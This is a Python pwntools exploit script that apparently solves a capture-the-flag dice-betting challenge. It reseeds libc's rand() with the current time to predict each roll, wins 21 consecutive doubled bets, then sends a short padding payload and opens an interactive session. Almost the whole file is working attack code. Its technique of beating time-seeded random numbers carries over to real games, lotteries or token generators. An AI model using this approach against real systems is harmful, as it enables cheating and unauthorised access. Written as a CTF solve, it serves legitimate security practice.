from pwn import *
import ctypes

TARGET = './chall'
HOST = '127.0.0.1'
PORT = 9999
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    # libc = ELF('')
else:
    p = process(TARGET)
    libc = elf.libc
    

#--- helper functions
s       = lambda data               :p.send(data)        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---


# Load the C standard library
libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")

# Define the argument and return types for srand
libc.srand.argtypes = [ctypes.c_uint]

# Define the argument and return types for rand
libc.rand.restype = ctypes.c_int

# Seed the random number generator with the current time
libc.srand(int(time.time()))


def guess(libc):
    # Generate a random number between 1 and 6
    r1 = libc.rand() % 6 + 1
    r2 = libc.rand() % 6 + 1
    r3 = libc.rand() % 6 + 1
    
    print(r1,r2,r3)
    points = r1+r2+r3
    if points >= 10:
        return 2
    return 1


balance = 20
for i in range(21):
    sla("Enter your bet (or enter 0 to quit): ", str(balance))
    sla("Enter 1 for small or 2 for big: ", str(guess(libc)))
    balance *= 2

sl("A"*16)
p.interactive()
